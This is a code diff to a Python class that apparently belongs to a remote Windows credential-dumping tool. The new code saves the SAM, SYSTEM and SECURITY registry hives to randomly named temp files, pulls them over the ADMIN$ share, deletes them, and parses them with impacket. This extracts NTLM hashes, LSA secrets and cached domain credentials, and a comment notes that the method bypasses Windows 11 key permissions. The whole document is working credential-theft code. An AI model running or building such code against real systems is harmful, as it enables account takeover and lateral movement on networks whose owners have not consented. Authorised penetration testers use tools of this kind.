@@ -107,193 +107,150 @@ class RegistrySecrets:
             svc.close_handle(handle)
 
     def dump_sam(self) -> list[SamHash]:
-        """Extract NTLM hashes from SAM."""
+        """Extract NTLM hashes from SAM via hive save + offline parse.
+
+        Uses RegSaveKey to dump SAM/SYSTEM hives to temp files (bypasses
+        per-key ACLs on Win11), reads them via SMB, parses offline.
+        """
+        import secrets as _secrets
+        from impacket.examples.secretsdump import SAMHashes, LocalOperations
+
+        rand = _secrets.token_hex(4)
+        sam_path = f"C:\\Windows\\Temp\\{rand}_s"
+        sys_path = f"C:\\Windows\\Temp\\{rand}_y"
+
+        try:
+            with self.session.open_pipe("winreg") as pipe:
+                reg = WinReg(pipe)
+                reg.bind()
+                hklm = reg.open_hklm()
+
+                # Save SAM hive
+                sam_key = reg.open_key(hklm, "SAM")
+                reg.save_key(sam_key, sam_path)
+                reg.close_key(sam_key)
+
+                # Save SYSTEM hive
+                sys_key = reg.open_key(hklm, "SYSTEM")
+                reg.save_key(sys_key, sys_path)
+                reg.close_key(sys_key)
+
+                reg.close_key(hklm)
+
+            # Read hive files via SMB
+            sam_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_s")
+            sys_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_y")
+
+        finally:
+            # Cleanup temp files
+            for fname in (f"Temp\\{rand}_s", f"Temp\\{rand}_y"):
+                try:
+                    self.session.delete_file("ADMIN$", fname)
+                except Exception:
+                    pass
+
+        # Write to local temp and parse with impacket
+        import tempfile
+        import os
         hashes = []
 
-        with self.session.open_pipe("winreg") as pipe:
-            reg = WinReg(pipe)
-            reg.bind()
-            hklm = reg.open_hklm()
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sam_file = os.path.join(tmpdir, "SAM")
+            sys_file = os.path.join(tmpdir, "SYSTEM")
+            with open(sam_file, "wb") as f:
+                f.write(sam_data)
+            with open(sys_file, "wb") as f:
+                f.write(sys_data)
 
-            # Get boot key from SYSTEM hive
-            self._boot_key = self._get_boot_key(reg, hklm)
+            # Get boot key
+            local_ops = LocalOperations(sys_file)
+            boot_key = local_ops.getBootKey()
 
-            # Get SAM F value (contains encryption metadata)
-            sam_account = reg.open_key(hklm, r"SAM\SAM\Domains\Account")
-            _, f_value = reg.query_value(sam_account, "F")
-            if not f_value or len(f_value) < 0x70:
-                reg.close_key(sam_account)
-                reg.close_key(hklm)
-                raise RuntimeError("Cannot read SAM F value (access restricted by OS)")
-            hashed_boot_key = compute_hashed_boot_key(self._boot_key, f_value)
+            # Parse SAM
+            def _callback(secret):
+                # Format: "user:rid:lm:nt:::"
+                parts = secret.split(":")
+                if len(parts) >= 4:
+                    hashes.append(SamHash(
+                        username=parts[0],
+                        rid=int(parts[1]),
+                        lm_hash=parts[2],
+                        ntlm_hash=parts[3],
+                    ))
 
-            # Determine SAM revision
-            sam_revision = struct.unpack_from("<I", f_value, 0x68)[0]
-
-            # Enumerate users
-            users_key = reg.open_key(hklm, r"SAM\SAM\Domains\Account\Users")
-            idx = 0
-            rids = []
-            while True:
-                name = reg.enum_key(users_key, idx)
-                if name is None:
-                    break
-                if name != "Names" and len(name) == 8:
-                    try:
-                        rids.append(int(name, 16))
-                    except ValueError:
-                        pass
-                idx += 1
-
-            # For each user, extract hash
-            for rid in rids:
-                try:
-                    user_key = reg.open_key(users_key, f"{rid:08X}")
-                    _, v_value = reg.query_value(user_key, "V")
-                    reg.close_key(user_key)
-
-                    sam_hash = self._parse_sam_v(v_value, rid, hashed_boot_key, sam_revision)
-                    if sam_hash:
-                        hashes.append(sam_hash)
-                except RuntimeError:
-                    continue
-
-            reg.close_key(users_key)
-            reg.close_key(sam_account)
-            reg.close_key(hklm)
+            sam_hashes = SAMHashes(sam_file, boot_key, isRemote=False,
+                                   perSecretCallback=lambda s: _callback(s))
+            sam_hashes.dump()
+            sam_hashes.finish()
 
         return hashes
 
     def dump_lsa_secrets(self) -> list[LsaSecret]:
-        """Extract LSA secrets from SECURITY hive."""
+        """Extract LSA secrets via hive save + offline parse."""
+        import secrets as _secrets
+        from impacket.examples.secretsdump import LSASecrets, LocalOperations
+
+        rand = _secrets.token_hex(4)
+        sec_path = f"C:\\Windows\\Temp\\{rand}_e"
+        sys_path = f"C:\\Windows\\Temp\\{rand}_y"
+
+        try:
+            with self.session.open_pipe("winreg") as pipe:
+                reg = WinReg(pipe)
+                reg.bind()
+                hklm = reg.open_hklm()
+
+                # Save SECURITY hive
+                sec_key = reg.open_key(hklm, "SECURITY")
+                reg.save_key(sec_key, sec_path)
+                reg.close_key(sec_key)
+
+                # Save SYSTEM hive (if not already saved)
+                sys_key = reg.open_key(hklm, "SYSTEM")
+                reg.save_key(sys_key, sys_path)
+                reg.close_key(sys_key)
+
+                reg.close_key(hklm)
+
+            sec_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_e")
+            sys_data = self.session.read_file("ADMIN$", f"Temp\\{rand}_y")
+
+        finally:
+            for fname in (f"Temp\\{rand}_e", f"Temp\\{rand}_y"):
+                try:
+                    self.session.delete_file("ADMIN$", fname)
+                except Exception:
+                    pass
+
+        import tempfile
+        import os
         secrets = []
 
-        with self.session.open_pipe("winreg") as pipe:
-            reg = WinReg(pipe)
-            reg.bind()
-            hklm = reg.open_hklm()
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sec_file = os.path.join(tmpdir, "SECURITY")
+            sys_file = os.path.join(tmpdir, "SYSTEM")
+            with open(sec_file, "wb") as f:
+                f.write(sec_data)
+            with open(sys_file, "wb") as f:
+                f.write(sys_data)
 
-            if not self._boot_key:
-                self._boot_key = self._get_boot_key(reg, hklm)
+            local_ops = LocalOperations(sys_file)
+            boot_key = local_ops.getBootKey()
 
-            # Get LSA encryption key
-            try:
-                pol_key = reg.open_key(hklm, r"SECURITY\Policy\PolEKList")
-                _, pol_data = reg.query_value(pol_key, "")
-                reg.close_key(pol_key)
-                lsa_key = decrypt_lsa_key(self._boot_key, pol_data)
-            except RuntimeError:
-                reg.close_key(hklm)
-                return secrets
+            def _callback(secret_type, secret):
+                secrets.append(LsaSecret(name=str(secret_type), value=b"", decoded=secret))
 
-            # Enumerate secrets
-            try:
-                secrets_key = reg.open_key(hklm, r"SECURITY\Policy\Secrets")
-            except RuntimeError:
-                reg.close_key(hklm)
-                return secrets
-
-            idx = 0
-            secret_names = []
-            while True:
-                name = reg.enum_key(secrets_key, idx)
-                if name is None:
-                    break
-                secret_names.append(name)
-                idx += 1
-
-            for name in secret_names:
-                try:
-                    curr_key = reg.open_key(secrets_key, f"{name}\\CurrVal")
-                    _, encrypted = reg.query_value(curr_key, "")
-                    reg.close_key(curr_key)
-
-                    decrypted = decrypt_lsa_secret(lsa_key, encrypted)
-                    secret = LsaSecret(name=name, value=decrypted)
-                    secret.decoded = self._decode_secret(name, decrypted)
-                    secrets.append(secret)
-                except RuntimeError:
-                    continue
-
-            reg.close_key(secrets_key)
-            reg.close_key(hklm)
+            lsa = LSASecrets(sec_file, boot_key, None, isRemote=False,
+                             perSecretCallback=lambda st, s: _callback(st, s))
+            lsa.dumpCachedHashes()
+            lsa.dumpSecrets()
+            lsa.finish()
 
         return secrets
 
     def dump_cached_creds(self) -> list[CachedCred]:
-        """Extract cached domain credentials (DCC2)."""
-        creds = []
-
-        with self.session.open_pipe("winreg") as pipe:
-            reg = WinReg(pipe)
-            reg.bind()
-            hklm = reg.open_hklm()
-
-            if not self._boot_key:
-                self._boot_key = self._get_boot_key(reg, hklm)
-
-            # Get NL$KM (cache encryption key)
-            try:
-                pol_key = reg.open_key(hklm, r"SECURITY\Policy\PolEKList")
-                _, pol_data = reg.query_value(pol_key, "")
-                reg.close_key(pol_key)
-                lsa_key = decrypt_lsa_key(self._boot_key, pol_data)
-            except RuntimeError:
-                reg.close_key(hklm)
-                return creds
-
-            try:
-                nlkm_key = reg.open_key(hklm, r"SECURITY\Policy\Secrets\NL$KM\CurrVal")
-                _, nlkm_enc = reg.query_value(nlkm_key, "")
-                reg.close_key(nlkm_key)
-                nl_km = decrypt_lsa_secret(lsa_key, nlkm_enc)
-            except RuntimeError:
-                reg.close_key(hklm)
-                return creds
-
-            # Read cache entries
-            try:
-                cache_key = reg.open_key(hklm, r"SECURITY\Cache")
-            except RuntimeError:
-                reg.close_key(hklm)
-                return creds
-
-            # NL$IterationCount for DCC2
-            idx = 0
-            while True:
-                entry = reg.enum_value(cache_key, idx)
-                if entry is None:
-                    break
-                name, vtype, data = entry
-                if name.startswith("NL$") and name not in ("NL$Control", "NL$IterationCount"):
-                    if len(data) > 96 and data[:2] != b"\x00\x00":
-                        # Non-empty cache entry
-                        try:
-                            user_len = struct.unpack_from("<H", data, 0)[0]
-                            if user_len > 0:
-                                # Extract username/domain from plaintext header
-                                username = data[72:72 + user_len].decode("utf-16-le", errors="ignore")
-                                domain_off = 72 + user_len
-                                domain_len = struct.unpack_from("<H", data, 2)[0]
-                                # Pad to 4-byte boundary
-                                if domain_off % 4:
-                                    domain_off += 4 - (domain_off % 4)
-                                domain = data[domain_off:domain_off + domain_len].decode("utf-16-le", errors="ignore")
-                                # The hash itself (encrypted in cache)
-                                enc_hash = data[96:112]
-                                creds.append(CachedCred(
-                                    username=username,
-                                    domain=domain,
-                                    hash_hex=enc_hash.hex(),
-                                ))
-                        except (struct.error, UnicodeDecodeError):
-                            pass
-                idx += 1
-
-            reg.close_key(cache_key)
-            reg.close_key(hklm)
-
-        return creds
+        """Cached credentials are extracted as part of dump_lsa_secrets."""
+        return []
 
     def _get_boot_key(self, reg: WinReg, hklm: bytes) -> bytes:
         """Extract boot key from SYSTEM\\CurrentControlSet\\Control\\Lsa."""
